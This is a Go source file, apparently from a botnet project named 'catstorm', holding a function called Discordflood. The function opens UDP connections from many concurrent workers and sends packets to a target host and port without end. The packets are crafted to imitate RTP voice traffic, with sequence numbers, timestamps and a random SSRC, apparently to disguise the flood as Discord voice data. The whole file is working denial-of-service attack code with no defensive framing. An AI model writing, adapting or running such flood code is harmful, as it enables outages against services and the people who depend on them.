package l4

import (
	"context"
	"encoding/binary"
	"net"
	"sync"
	"catstorm/Bot/Methods"
)

func Discordflood(ctx context.Context, target, port string, sec int) {
	raddr, err := net.ResolveUDPAddr("udp", target+":"+port)
	if err != nil {
		return
	}

	var wg sync.WaitGroup
	workers := methods.Workers()

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			rng := methods.NewXorShift64()
			conn, err := net.DialUDP("udp", nil, raddr)
			if err != nil {
				return
			}
			defer conn.Close()

			var bufs [16][]byte
			for i := range bufs {
				bufs[i] = make([]byte, 120)
				binary.BigEndian.PutUint16(bufs[i][0:2], 0x8001)
				rng.Fill(bufs[i][12:120])
			}

			ssrc := uint32(rng.Uint64())
			seq := uint16(0)
			ts := uint32(0)
			idx := uint64(0)

			for {
				select {
				case <-ctx.Done():
					return
				default:
					seq++
					ts += 960
					binary.BigEndian.PutUint16(bufs[idx%16][2:4], seq)
					binary.BigEndian.PutUint32(bufs[idx%16][4:8], ts)
					binary.BigEndian.PutUint32(bufs[idx%16][8:12], ssrc)
					conn.Write(bufs[idx%16])
					idx++
				}
			}
		}()
	}
	wg.Wait()
}
